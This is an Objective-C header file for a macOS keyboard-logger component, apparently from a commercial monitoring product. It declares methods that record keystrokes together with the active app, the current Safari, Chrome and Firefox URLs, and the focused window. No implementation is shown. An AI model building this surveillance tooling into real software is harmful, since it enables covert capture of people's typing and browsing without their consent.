//
//  KeyboardLoggerUtils.h
//  KeyboardLoggerManager
//
//  Created by Makara Khloth on 10/30/13.
//  Copyright (c) 2013 Vervata. All rights reserved.
//

#import <Foundation/Foundation.h>
#include <MacTypes.h>

@interface KeyboardLoggerUtils : NSObject {

}

+ (NSString *) getCurrentAppID;
+ (NSString *) safariUrl;
+ (NSString *) chromeUrl;
+ (NSString *) firefoxUrl;
+ (NSMutableDictionary *) mergeKeyInfo: (NSDictionary *) aKeyInfo1 withKeyInfo: (NSDictionary *) aKeyInfo2;
+ (NSMutableDictionary *) getPreviousKeyInfoWithArray: (NSArray *) aKeyLoggerArray byNewKeyInfo: (NSDictionary *) aNewKeyInfo;
+ (NSMutableDictionary *) getKeyInfoWithKeyString:(NSString *)aKeyString rawKeyRep: (NSString *) aRawKeyRep activeAppInfo:(NSDictionary *)aActiveAppInfo psn: (ProcessSerialNumber) aPSN;

+ (NSArray *) windowDictsOfSavePanelService;
+ (NSDictionary *) embeddedWindowDictWithPID: (pid_t) aPID;
+ (NSArray *) embeddedWindowsArrayWithPID: (pid_t) aPID;
+ (BOOL) isEmbeddedWindowInFocused: (pid_t) aEmbeddedPID inRemoteApp:(pid_t)aRemotePID;

@end
